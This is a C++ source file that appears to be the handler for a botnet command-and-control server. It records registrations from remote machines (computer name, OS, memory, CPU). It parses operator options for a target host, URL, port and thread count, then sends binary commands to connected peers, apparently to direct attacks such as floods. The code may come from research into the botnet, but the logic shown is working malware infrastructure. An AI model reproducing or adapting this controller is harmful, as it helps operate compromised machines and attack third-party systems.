/*****************************************************************
 * Created on 2012/01/31
****************************************************************/

#include <iostream>
#include <iomanip>
#include <ctime>

#include <pcap.h>
#include <assert.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <pwd.h>
#include <time.h>
#include <malloc.h>
#include <pthread.h>
#include <fcntl.h>
#include <syslog.h>
#include <arpa/inet.h>

#include <zlib.h>

#include "common.h"
#include "dslserverklr.h"
#include "dslserverklr_handler.h"

using namespace std;

int dslhandler::on_read()
{
    int ret = bdatahandler::on_read();
    if (BERROR == ret)
    {
        return BERROR;
    }

    printf("dslhandler::on_read(): peer=%s:%d, msg_len=%d, "
        "sizeof(dshell_register_msg)=%d\n", 
        inet_ntoa(m_addr.sin_addr), ntohs(m_addr.sin_port), ret, 
        sizeof(dslserverklr_register_msg));

    char buf[512];
    bdatahandler::copy(buf, sizeof(dslserverklr_register_msg));
    if (DSLSERVERKLR_MSG_SIZE == ret)
    {
        dslserverklr_register_msg *msg = (dslserverklr_register_msg *)buf;
        cout << "register from " << inet_ntoa(m_addr.sin_addr) << ":" <<  \
            ntohs(m_addr.sin_port) << endl;
        cout << " computer_name: " << msg->computer_name<< endl;
        cout << " os: " << msg->os << endl;
        cout << " mem: " << msg->mem<< endl;
        cout << " cpu: " << msg->cpu << endl;        
        cout << " unknown: " << msg->other << endl;
    }
    else
    {
        hex_dump((u_char *)buf, ret); 
    }

    return BSUCCESS;
}

int dslhandler::on_command(std::vector<std::string> &strs)
{
    dslserverklr_command cmd;
    memset(&cmd, 0, sizeof(cmd));

    cout << "dslhandler::on_command" << endl;

    // parse command line
    dslserverklr_cmd_info cmdinfo;
    str_vector_t::iterator iter;
    for (iter = strs.begin(); iter != strs.end(); )
    {
        std::string opt = *iter;
        iter++;
        if (iter == strs.end())
        {
            cout << "no value for " << opt << endl;
            return BERROR;
        }

        std::string value = *iter;        
                
        if (opt == "-code")
        {
            cmd.cmdcode = atoi(value.c_str());
        }
        else if (opt == "-code2")
        {
            cmdinfo.subcode = atoi(value.c_str());
        }
        else if (opt == "-target")
        {            
            cmdinfo.host = value;
        }
        else if (opt == "-url")
        {            
            cmdinfo.url = value;
        }
        else if (opt == "-port")
        {
            cmdinfo.port = atoi(value.c_str());
        }
        else if (opt == "-thread")
        {
            cmdinfo.threads = atoi(value.c_str());
        }        

        iter++;
    }

    cmdinfo.datasize = 1024;

    dsl_makecmd(cmd, cmdinfo);
    
    return send((char *)&cmd, DSLSERVERKLR_MSG_SIZE);
}

int dslhandler::send(char data [ ], int len)
{
    //dslserverklr_command*send_msg = (dslserverklr_command *)data;
    
    log_msg(false, data, len);    
    return bdatahandler::send(data, len);
}

#if 0
int dslhandler::log_msg(bool in, char data[], int len)
{
    int ret;
    if (in)
    {
        ret = save_message("./messages", CB1ST_MSG_PREFIX_INPUT, CB1ST_MSG_PREFIX_INPUT_LEN);
    }
    else
    {
        ret = save_message("./messages", CB1ST_MSG_PREFIX_OUTPUT, CB1ST_MSG_PREFIX_OUTPUT_LEN);
    }

    char buf[64];
    sprintf(buf, "%s:%d", inet_ntoa(m_addr.sin_addr), ntohs(m_addr.sin_port));
    ret += save_message("./messages", buf, strlen(buf));

    int padding = 0;
    char paded[] = "CCCCCCCCCCCCCCCCCCCCCCC";
    if ((strlen(buf) % 16) != 0)
    {
        int i;        
        padding = 16 - (strlen(buf) % 16);
        ret += save_message("./messages", paded, padding);
    }
    
    // in net order for easy reading
    len = htonl(len);
    ret += save_message("./messages", (char *)&len, sizeof(len));
    len = ntohl(len);
    
    ret += save_message("./messages", data, len);
    
    if (((len + 4) % 16) != 0)
    {
        int i;        
        padding = 16 - ((len + 4) % 16);
        ret += save_message("./messages", paded, padding);
    }

    return ret;
}
#endif

bdatahandler *dslfactory::make(int fd)
{
    printf("dslfactory::make: fd=%d\n", fd);
    dslhandler *handler = new dslhandler(fd);
    if (NULL == handler)
    {
        return NULL;
    }

    m_handlers_list.push_back(handler);
    handler->set_factory(this);
    return handler;
}

bdatahandler *dslfactory::find(bid &id)
{
    std::list<dslhandler *>::iterator iter;
    dslhandler *p;
    for (iter = m_handlers_list.begin(); iter != m_handlers_list.end(); iter++)
    {
        p = *iter;
        if (0 == p->compare(id))
        {
            return p;
        }
    }

    return NULL;
}

void dslfactory::showall()
{
    std::list<dslhandler *>::iterator iter;
    dslhandler *p;
    for (iter = m_handlers_list.begin(); iter != m_handlers_list.end(); iter++)
    {
        p = *iter;
        p->showid();
        cout << std::endl;
    }
}

